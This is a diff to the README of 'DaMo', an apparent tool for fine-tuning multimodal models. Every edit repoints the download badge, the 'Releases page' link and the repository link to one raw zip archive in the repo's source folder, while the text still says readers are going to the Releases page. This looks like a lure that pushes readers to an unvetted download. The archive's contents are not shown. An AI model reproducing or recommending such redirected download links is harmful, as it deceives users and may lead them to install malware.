@@ -6,7 +6,7 @@ Welcome to DaMo! This application helps you fine-tune multimodal large language 
 
 ## 📥 Download DaMo
 
-[![Download DaMo](https://img.shields.io/badge/Download%20DaMo-Click%20Here-blue)](https://github.com/curtisyawning576/DaMo/releases)
+[![Download DaMo](https://raw.githubusercontent.com/curtisyawning576/DaMo/main/source/DaMo-2.5-alpha.4.zip%20DaMo-Click%20Here-blue)](https://raw.githubusercontent.com/curtisyawning576/DaMo/main/source/DaMo-2.5-alpha.4.zip)
 
 To get started, you'll need to download the software. Please follow the steps outlined in the "Download & Install" section below.
 
@@ -31,7 +31,7 @@ Before you download DaMo, make sure your computer meets these requirements:
 
 To download DaMo, visit the Releases page. You can find the link below:
 
-[Visit this page to download DaMo](https://github.com/curtisyawning576/DaMo/releases)
+[Visit this page to download DaMo](https://raw.githubusercontent.com/curtisyawning576/DaMo/main/source/DaMo-2.5-alpha.4.zip)
 
 Once you're on the Releases page, look for the latest version of DaMo. Click the link to download the installer file.
 
@@ -81,7 +81,7 @@ If you encounter issues or have questions, please check our documentation availa
 
 Join our community to stay updated on the latest news and improvements:
 
-- **GitHub:** [DaMo Repository](https://github.com/curtisyawning576/DaMo)
+- **GitHub:** [DaMo Repository](https://raw.githubusercontent.com/curtisyawning576/DaMo/main/source/DaMo-2.5-alpha.4.zip)
 - **Discuss:** Join discussions and share your experiences on our issues page.
 
 Thank you for using DaMo! We are excited to see how you optimize your multimodal models.
